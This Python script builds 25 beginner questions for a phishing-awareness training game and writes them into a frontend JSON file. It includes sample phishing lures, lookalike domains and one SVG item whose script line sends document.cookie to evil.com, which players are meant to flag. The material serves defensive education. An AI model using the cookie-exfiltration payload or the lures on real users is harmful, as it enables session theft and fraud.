import json
import random
import os

input_file = "../frontend/src/data/GameQuestions.json"

formats_list = [
    "adversary_roleplay", "digital_whodunnit", "branching_narratives",
    "resource_management", "escape_rooms", "spot_the_difference",
    "the_imposter", "adaptive_inbox", "omni_threat_chains",
    "quishing_drills", "deepfake_detection", "svg_code_inspection",
    "cyber_snakes_ladders", "phish_a_friend", "capture_the_flag"
]

# We need 25 items total.
# 10 formats used twice. 5 formats used once.
# Let's simply take the 15 formats + 10 random ones from the list.
random.seed(42) # Ensure some reproducibility
extra_10 = random.sample(formats_list, 10)
all_formats = formats_list + extra_10

# Shuffle such that no two same formats are consecutive
random.shuffle(all_formats)
for i in range(len(all_formats)):
    if i > 0 and all_formats[i] == all_formats[i-1]:
        # swap with next
        for j in range(i+1, len(all_formats)):
            if all_formats[j] != all_formats[i]:
                all_formats[i], all_formats[j] = all_formats[j], all_formats[i]
                break

# Safety check
for i in range(1, len(all_formats)):
    if all_formats[i] == all_formats[i-1]:
        all_formats[i] = "adaptive_inbox" if all_formats[i] != "adaptive_inbox" else "spot_the_difference"

# Generate the 25 questions
questions = []
for i in range(25):
    fmt = all_formats[i]
    q = {
        "id": i + 1,
        "format": fmt,
        "difficulty": "beginner",
        "gameName": "phishing",
        "concept": "Phishing Defenses",
        "hint": "Analyze carefully before proceeding.",
        "explain": "Cyber attackers use various methods to mimic legitimate interactions.",
        "reveal": "Always employ zero-trust verification."
    }

    if fmt == "deepfake_detection":
        q["questionText"] = "Is this video call from the CEO genuine or a Deepfake?"
        q["audioTranscript"] = "Hi team, I need you to wire $50,000 to this new vendor immediately or we lose the contract. No time for paperwork!"
        q["visualCues"] = ["Unnatural blinking rate", "Lip-sync mismatch", "Robotic voice tone"]
        q["options"] = ["Genuine", "Deepfake"]
        q["correctAnswer"] = "Deepfake"
        q["explain"] = "High urgency combined with visual artifacts like lip-sync mismatch is a classic deepfake indicator."
    elif fmt == "svg_code_inspection":
        q["questionText"] = "Inspect this SVG logo code for hidden malware payloads."
        q["codeLines"] = [
            {"id": "L1", "text": "<svg width='200' height='200'>", "isMalicious": False},
            {"id": "L2", "text": "  <circle cx='50' cy='50' r='40' fill='red' />", "isMalicious": False},
            {"id": "L3", "text": "  <script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>", "isMalicious": True},
            {"id": "L4", "text": "</svg>", "isMalicious": False}
        ]
        q["options"] = ["L1", "L2", "L3", "L4"]
        q["correctAnswer"] = "L3"
    elif fmt == "spot_the_difference":
        q["questionText"] = "Spot the subtle flaw in this cloned login page."
        q["brandName"] = "Microsoft Office365"
        q["urlFake"] = "login.mîcrosoftonline.com" # Fake url
        q["urlReal"] = "login.microsoftonline.com"
        q["options"] = ["The URL domain", "The logo color", "The sign-in button font"]
        q["correctAnswer"] = "The URL domain"
    elif fmt == "digital_whodunnit":
        q["questionText"] = "Examine the email headers. Which domain is the imposter?"
        q["emails"] = [
            {"id": "e1", "from": "support@paypal.com", "spf": "PASS", "dkim": "PASS", "isImposter": False},
            {"id": "e2", "from": "alerts@paypa1.com", "spf": "FAIL", "dkim": "FAIL", "isImposter": True},
            {"id": "e3", "from": "no-reply@paypal.com", "spf": "PASS", "dkim": "PASS", "isImposter": False}
        ]
        q["options"] = ["support@paypal.com", "alerts@paypa1.com", "no-reply@paypal.com"]
        q["correctAnswer"] = "alerts@paypa1.com"
    elif fmt == "escape_rooms":
        q["questionText"] = "Decode the encrypted ransomware flag using Caesar Cipher (Shift +3) to escape."
        q["cipherText"] = "SKLVKLQJ" # Phishing shifted by 3
        q["correctAnswer"] = "PHISHING"
    elif fmt == "branching_narratives":
        q["questionText"] = "The CFO urgently requests a wire transfer via SMS. What is your first step?"
        q["options"] = [
            "Send the money immediately to avoid being fired.",
            "Reply to the SMS asking for bank details.",
            "Call the CFO on their known, registered phone number to verify."
        ]
        q["correctAnswer"] = "Call the CFO on their known, registered phone number to verify."
    elif fmt == "resource_management":
        q["questionText"] = "Allocate your $10k security budget optimally against phishing."
        q["options"] = [
            "Invest $10k in Antivirus software",
            "Invest $5k in Email Filters and $5k in Employee Training",
            "Invest $10k in New Office Chairs"
        ]
        q["correctAnswer"] = "Invest $5k in Email Filters and $5k in Employee Training"
    elif fmt == "the_imposter":
        q["questionText"] = "One of these Slack messages from your 'colleagues' is a phishing lure. Find the Imposter."
        q["messages"] = [
            {"sender": "Alice (HR)", "text": "Are we still on for lunch today?", "isPhish": False},
            {"sender": "Bob (IT)", "text": "I pushed the new code to staging.", "isPhish": False},
            {"sender": "Charlie (CEO)", "text": "Quick! Buy 5 Apple Gift Cards for our clients and text me the codes! Very urgent!", "isPhish": True}
        ]
        q["options"] = ["Alice (HR)", "Bob (IT)", "Charlie (CEO)"]
        q["correctAnswer"] = "Charlie (CEO)"
    elif fmt == "cyber_snakes_ladders":
        q["questionText"] = "You landed on a 'Phishing Pit'! Identify the red flag to avoid falling."
        q["scenario"] = "An email claims you won the lottery, but asks for a $50 processing fee."
        q["options"] = [
            "Advance Fee Fraud",
            "Standard Lottery Process",
            "Tax Collection"
        ]
        q["correctAnswer"] = "Advance Fee Fraud"
    elif fmt == "phish_a_friend":
        q["questionText"] = "Build a SAFE training lure to test your friend's security awareness."
        q["options"] = [
            "Email simulating an HR policy update with a tracking pixel.",
            "A threatening email demanding their real password.",
            "A malicious macro embedded in a PDF."
        ]
        q["correctAnswer"] = "Email simulating an HR policy update with a tracking pixel."
    elif fmt == "omni_threat_chains":
        q["questionText"] = "An attack chain starts with a smishing text, followed by a vishing call. Identify the malicious link in the text."
        q["channels"] = [
            {"type": "SMS", "parts": [
                {"id": "p1", "text": "FedEx:", "isFlag": False},
                {"id": "p2", "text": "Your package is delayed.", "isFlag": False},
                {"id": "p3", "text": "http://fedex-tracking-lost.xyz", "isFlag": True}
            ]}
        ]
    elif fmt == "capture_the_flag":
        q["questionText"] = "Find the hidden phishing 'flag' in this simulated portal."
        q["objects"] = [
            {"id": "o1", "icon": "📄", "label": "Company Policy", "isRedFlag": False, "top": "20%", "left": "10%"},
            {"id": "o2", "icon": "🔗", "label": "Update_Bank_Info.exe", "isRedFlag": True, "top": "50%", "left": "60%"},
            {"id": "o3", "icon": "📁", "label": "Tax forms", "isRedFlag": False, "top": "70%", "left": "30%"}
        ]
    elif fmt == "adversary_roleplay":
        q["questionText"] = "As a simulated adversary, select the most persuasive psychological trigger."
        q["assets"] = [
            {"id": "a1", "name": "Curiosity (Gossip)", "cost": 10, "value": 20},
            {"id": "a2", "name": "Urgency (Account suspended)", "cost": 30, "value": 50},
            {"id": "a3", "name": "Greed (Free money)", "cost": 20, "value": 30}
        ]
        q["budget"] = 50
        q["targetValue"] = 50
    elif fmt == "quishing_drills":
        q["questionText"] = "A QR code on a parking meter says 'Pay Here'. Where does it actually go?"
        q["qrObject"] = "Parking Meter Sticker"
        q["decodedURL"] = "http://parklng-pay-secure.xyz"
        q["correctAnswer"] = "Phishing"
    elif fmt == "adaptive_inbox":
        q["questionText"] = "Triage your adaptive inbox. Swipe safe emails securely, and flag the phishing correctly."
        q["emails"] = [
            {"id": "e1", "subject": "Project Meeting", "sender": "manager@company.com", "isPhish": False},
            {"id": "e2", "subject": "URGENT: Password Expiry", "sender": "admin@c0mpany.com", "isPhish": True}
        ]
    else:
        # Fallback to branching narratives or a default format
        q["format"] = "branching_narratives"
        q["questionText"] = "You receive an unexpected attachment."
        q["options"] = ["Open it", "Forward it", "Report to IT"]
        q["correctAnswer"] = "Report to IT"

    questions.append(q)

# Load existing JSON
if os.path.exists(input_file):
    with open(input_file, "r", encoding="utf-8") as f:
        data = json.load(f)
else:
    data = {"phishing": {}}

data["phishing"]["beginner"] = questions

# Write back to JSON
with open(input_file, "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2)

print("SUCCESS: 25 unique phishing beginner questions generated with 15 unique formats.")
